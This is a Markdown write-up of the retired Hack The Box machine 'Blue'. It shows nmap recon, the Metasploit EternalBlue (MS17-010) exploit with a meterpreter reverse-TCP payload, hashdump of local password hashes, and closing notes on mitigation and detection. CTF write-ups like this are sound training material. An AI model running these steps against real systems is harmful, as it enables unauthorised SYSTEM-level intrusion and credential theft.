---
machine: Blue
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, ms17-010, eternalblue, smb, metasploit]
---

# Blue — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

An unpatched Windows 7 with SMBv1 exposed. **MS17-010 (EternalBlue)** gives code execution as `NT AUTHORITY\SYSTEM` in a single step; `hashdump` then pulls the local hashes, and both flags sit on the desktops of `haris` and `Administrator`. The point of the box is that there is no escalation: the bug is in the kernel and executes in SYSTEM context.

## Recon

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
135/tcp   msrpc        Microsoft Windows RPC
139/tcp   netbios-ssn
445/tcp   microsoft-ds Windows 7 Professional 7601 Service Pack 1
3389/tcp  tcpwrapped
```

```bash
nmap -p445 --script smb-vuln-ms17-010 <IP>
```

```text
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

`smbclient -L` also reveals the hostname `HARIS-PC`.

## Foothold

With Metasploit it is a straight line: `exploit/windows/smb/ms17_010_eternalblue` speaks SMBv1, corrupts the kernel pool and runs the payload in kernel mode, which spawns a SYSTEM shell.

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS <IP>
msf6 > set LHOST <your IP>
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > run

[*] Sending stage (201798 bytes) to <IP>
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

If the exploit fails because of pool state, rebooting the target or retrying a few times is usually enough; the SMB crash (`BugCheck`) does not persist.

## Post-exploitation

```text
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<hash>::
Guest:501:...
haris:1000:aad3b435b51404eeaad3b435b51404ee:<hash>::
```

```text
meterpreter > cat "C:\\Users\\haris\\Desktop\\user.txt"
meterpreter > cat "C:\\Users\\Administrator\\Desktop\\root.txt"
```

Without Metasploit: any public EternalBlue implementation (worawit's `MS17-010`, `eternalblue-doublepulsar`, …) with your own reverse-shell shellcode, or the AutoBlue script.

## Evidence (redacted)

```text
C:\Users\haris\Desktop\user.txt          -> <user_flag>
C:\Users\Administrator\Desktop\root.txt  -> <root_flag>
```

## Lessons

- SMBv1 and MS17-010 are the canonical example of a remotely exploitable kernel bug: one packet compromises the host.
- The vector needs no credentials and no interaction; patching is the only real defence, because port 445 is exposed by design.
- Mitigation: disable SMBv1 (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`), block 445 at the perimeter, apply MS17-010. Detection leans on service crash events and anomalous SMB traffic with oversized `NT Trans` requests.
